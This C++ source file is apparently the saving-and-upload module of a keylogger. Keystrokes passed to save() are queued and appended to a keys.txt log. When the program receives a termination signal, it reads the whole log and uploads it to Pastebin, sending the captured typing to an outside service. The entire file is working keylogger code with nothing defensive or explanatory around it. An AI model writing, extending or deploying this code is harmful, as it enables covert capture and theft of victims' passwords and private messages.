#include "save.h"
#include "pastebinSend.h"
#include <iostream>
#include <chrono>
#include <queue>
#include <mutex>
#include <fstream>
#include <thread>
#include <curl/curl.h>
#include <csignal>

std::queue<std::string> keystrokesQueue;
std::mutex keystrockesMutex;

void save(std::string text) {
    keystrockesMutex.lock();
    keystrokesQueue.push(text);
    keystrockesMutex.unlock();
}

// Global variable to indicate program termination
std::atomic<bool> terminateProgram(false);

// Signal handler function
void signalHandler(int signum) {
    if (signum == SIGINT) {
        std::cout << "Termination signal received. Program will terminate gracefully." << std::endl;
        terminateProgram.store(true);
    }
}

void saveLoop() {
    // Register signal handler
    signal(SIGINT, signalHandler);

    while (!terminateProgram.load()) {
        keystrockesMutex.lock();
        while (!keystrokesQueue.empty()) {
            std::ofstream myfile;
            myfile.open("keys.txt", std::ofstream::app);
            myfile << keystrokesQueue.front();
            keystrokesQueue.pop();
            myfile.close();
        }
        keystrockesMutex.unlock();
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    // Upon termination, upload data to Pastebin
    std::ifstream infile("keys.txt");
    std::string fileContent((std::istreambuf_iterator<char>(infile)), (std::istreambuf_iterator<char>()));
    infile.close();

    // Save the content to a temporary file
    std::ofstream tempfile("temp_keys.txt");
    tempfile << fileContent;
    tempfile.close();

    // Send the temporary file to Pastebin
    if (!sendFileToPastebin("temp_keys.txt")) {
        std::cerr << "Failed to upload to Pastebin." << std::endl;
    }
}